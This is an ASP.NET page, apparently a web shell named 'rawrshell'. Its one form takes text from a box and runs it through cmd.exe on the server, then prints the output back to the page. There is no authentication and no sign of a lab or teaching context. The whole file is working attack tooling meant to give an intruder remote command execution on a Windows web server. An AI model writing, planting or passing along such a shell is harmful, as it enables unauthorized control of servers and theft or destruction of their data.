<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
 
 void Page_Load(object sender, EventArgs e) {
 }
 string rawr(string arg){
    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c "+arg;
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    StreamReader stmrdr = p.StandardOutput;
    string s = stmrdr.ReadToEnd();
    stmrdr.Close();
    return s;
 }
 void clicky(object sender, System.EventArgs e) {
    Response.Write("<pre>");
    Response.Write(Server.HtmlEncode(rawr(txtArg.Text)));
    Response.Write("</pre>");
 }
</script>
<HTML>
 <HEAD>
  <title>rawrshell</title>
 </HEAD>
 <body>
  <form id="cmd" method="post" runat="server">
   <asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
   <asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="run things" OnClick="clicky"></asp:Button>
   <asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">type here</asp:Label>
  </form>
 </body>
</HTML>
